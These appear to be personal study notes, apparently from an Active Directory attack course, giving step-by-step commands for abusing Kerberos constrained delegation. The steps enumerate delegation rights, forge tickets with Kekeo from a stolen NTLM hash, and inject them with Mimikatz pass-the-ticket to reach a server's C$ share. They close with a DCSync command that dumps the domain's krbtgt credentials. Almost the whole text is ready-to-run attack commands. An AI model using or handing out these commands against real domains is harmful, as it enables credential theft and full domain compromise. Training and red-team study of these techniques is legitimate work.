** Run Mimikatz for Pass the ticket attack from the same location from where TGT/TGT was created. (Ex. C:\AD\Tools\Kekeo\x64\)**

How to find contrained Delegation and Exploit Contrained Delegation for a User
• PowerView Dev Module
    • Get-DomainUser -TrustedToAuth --> (Identify the Users and Service for which user is allowed to Delegate)
• AD Module
    • Get -ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -->  (Identify the User / Machine Accounts and Service for which user / machine account is allowed to Delegate)
• Compromised the server or get the ntlm hash of the user that is performing constrained delagation.
• Open a PowerShell Session with standard User rights (On the our machine)
    • Initialised Kekeo.exe
        • tgt::ask /user:username /domain:FQDN_Domain_Name /rc4:Hash_of_the_user
            • This is for requesting TGT. Similar to Step 2 and 3 from above image
            • This is to Request TGT ticket for Affected user
        • tgs::s4u /tgt:TICKET_NAME /user:Administrator@FQDN_Domain_Name /service:name_of_service_that_the_user_is_allowed_to_delegate 
            • This is for requesting TGTS Similar to Step 4 and 5 from above image.
            • This is to Request TGS ticket for affected user. The TGT ticket is from the previous command.
    • Import Invoke-Mimikatz.ps1
    • Invoke-Mimikatz -Command '"kerberos::ptt ticket_name.kirbi"'
        • This is inject ticket in the current PowerShell Session. The TGS ticket is from the previous command.
    • Klist.exe
        • To verify the ticket
    • Access the service
        • Ex: ls \\FQDN_NAME_OF_The_Server\C$

How to find contrained Delegation and Exploit Contrained Delegation for a Machine Account
• PowerView Dev Module
    • Get-DomainComputer -TrustedToAuth --> (Identify the Machine Accounts and Service for which machine Account is allowed to Delegate)
• AD Module
    • Get -ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -->  (Identify the User / Machine Accounts and Service for which user / machine account is allowed to Delegate)
• Compromised the server or get the ntlm hash of the user that is performing constrained delagation.
    • Initialised Kekeo.exe
        • tgt::ask /user:username /domain:FQDN_Domain_Name /rc4:Hash_of_the_user
            • This is for requesting TGT. Similar to Step 2 and 3 from above image.
            • This is to Request TGT ticket for Affected user
        • tgs::s4u /tgt:TICKET_NAME /user:Administrator@FQDN_Domain_Name /service:name_of_service_that_the_user_is_allowed_to_delegate 
            • This is for requesting TGT. Similar to Step 4 and 5 from above image.
            • This is to Request TGS ticket for affected user. The TGT ticket is from the previous command.
    • Import Invoke-Mimikatz.ps1
    • Invoke-Mimikatz -Command '"kerberos::ptt ticket_name.kirbi"'
        • This is inject ticket in the current PowerShell Session. The TGS ticket is from the previous command.
    • Klist.exe
        • To verify the ticket
    • Access the service
        • Ex: ls \\FQDN_NAME_OF_The_Server\C$
    • With LDAP like service access; DCSync attacks can also be executed.
        • Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
            • This command can be used to extract credentials for any user / machine account in the domain from DC.
